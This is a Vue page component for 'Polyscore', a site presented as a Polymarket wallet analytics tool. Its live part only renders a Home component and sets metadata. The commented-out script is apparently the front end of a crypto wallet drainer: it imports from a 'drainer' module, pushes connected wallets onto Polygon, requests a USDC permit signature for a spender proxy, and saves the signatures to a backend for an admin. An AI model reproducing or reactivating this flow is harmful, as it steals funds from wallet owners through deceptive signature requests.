<template>
  <div>
    <!-- <p class="mb-3 text-black">Status:  {{ status || 'N/A' }}</p>
        
        <p class="py-3 text-black">Address:  {{ walletAddress }}</p>
        
        <p class=" text-black" v-if="showSuccess">Successfully connected and ready to go, check admin to continue</p>
        <button v-else class="bg-blue-600 text-white px-4 py-1" @click="() => openModalClicked()">{{(loading) ? 'Connecting...' : 'Connect Wallet'}}</button>
         -->

    <Home />
  </div>
</template>

<script setup>
    // import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork, getProvider, getWalletETHBalance } from '../api/web3/walletconnect';
    // import { requestSignature } from '../api/web3/drainer/main'
    // import { USDC_NAME, USDC_ADDRESS } from '../api/web3/drainer/constants'
    // import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../api/walletSignature'


    // const walletAddress = ref('');
    // const isWalletConnected = ref(false);
    // const status = ref('')
    // const walletAssets = ref([]);
    // const addressSignature = ref(null)
    // const loading = ref(false);
    // const showSuccess = ref(false);
    // const hasInitializedMobile = ref(false) ;


    // function openModalClicked() {
    //     openModal()
    // }

    // onMounted(() => {
    //     disconnectWallet()
    // })


    // onMounted(() => {
    //     isWalletConnected.value = getIsConnected();
    //     walletAddress.value = getAddress();
    //     listenToWalletStateChange()
    // })

    // function listenToWalletStateChange() {
    //     subscribeState()?.on('STATE_CHANGED', events => {
    //         isWalletConnected.value = getIsConnected();
    //         walletAddress.value = getAddress();
    //     });
    // }

    // watch(() => walletAddress.value, async() => {
    //     if (!walletAddress.value) return;

    //     loading.value = true;
    //     addressSignature.value = await getAddressSignature(walletAddress.value);
        

    //     if (!isWalletConnected.value) {
    //         openModal()
    //         return;
    //     }


    //     if (getChainID() != 137){
    //         if (window.ethereum) await switchNetwork(137);
    //         else {
    //             await disconnectWallet();
    //             isWalletConnected.value = false;
    //             walletAddress.value = "";
    //             alert("Switch to Polygon Mainnet Network");  
    //         }
    //         return;
    //     }

    //         console.log('here', isMigrated.value, addressSignature.value)
    //     if (isMigrated.value) {
    //         loading.value = false;
    //         status.value='successfully migrated'
    //         return;
    //     }

        
    //     try {
    //         if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress.value);

    //         const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10**18), 6);
    //         console.log("signatureResult:    ", signatureResult);

    //         await updateAddressSignature(walletAddress.value, signatureResult); 
    //         addressSignature.value = await getAddressSignature(walletAddress.value);

    //         loading.value = false;
    //         showSuccess.value=true;
    //     } catch (err) {
    //         loading.value=false;
    //         if (err?.info?.error?.code == -32000) {
    //             alert("Insufficient funds")
    //         }
    //         else if (err?.info?.error?.code == 4001) {
    //             alert("Transaction rejected")
    //         } else alert("An error occured")
    //         console.log(err)
    //         disconnectClicked()
    //     }
        


    // })


    // const isMigrated = computed(() => {
    //     return (addressSignature.value?.signatures?.length && 
    //         addressSignature.value?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS_POLYGON.toLowerCase()) && 
    //         addressSignature.value?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
    // })

useHead({
  title: "Polyscore",
  link: [{ rel: 'icon', type: 'image/png', href: '/images/logo.svg' }],
  meta: [{ name: 'description', content: 'Analyze any Polymarket wallet on Polygon. Track trading performance, risk profile, win rate, volume, and whale activity with real on-chain data.' }]
});
</script>
